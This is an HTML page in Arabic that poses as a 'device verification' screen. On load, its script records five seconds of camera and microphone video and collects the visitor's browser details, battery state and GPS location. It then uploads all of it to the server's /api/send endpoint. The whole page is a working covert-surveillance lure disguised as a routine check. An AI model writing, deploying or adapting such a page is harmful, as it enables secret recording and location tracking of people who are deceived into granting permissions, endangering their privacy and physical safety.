<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>يتم التحقق من الجهاز</title>
</head>
<body>
  <h2>جارٍ التحقق من الجهاز...</h2>

  <script>
    async function getDeviceInfo() {
      const battery = await navigator.getBattery?.();
      const geo = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(pos => resolve(pos), () => resolve(null));
      });

      return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        battery: battery ? `${Math.floor(battery.level * 100)}% - ${battery.charging ? 'Charging' : 'Not Charging'}` : "N/A",
        location: geo ? `${geo.coords.latitude},${geo.coords.longitude}` : "Location denied",
      };
    }

    async function startRecording() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      const recorder = new MediaRecorder(stream);
      const chunks = [];

      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        const formData = new FormData();
        formData.append("video", blob, "recording.webm");

        const info = await getDeviceInfo();
        formData.append("info", JSON.stringify(info));

        await fetch("/api/send", {
          method: "POST",
          body: formData
        });
      };

      recorder.start();
      setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثوانٍ فقط
    }

    startRecording();
  </script>
</body>
</html>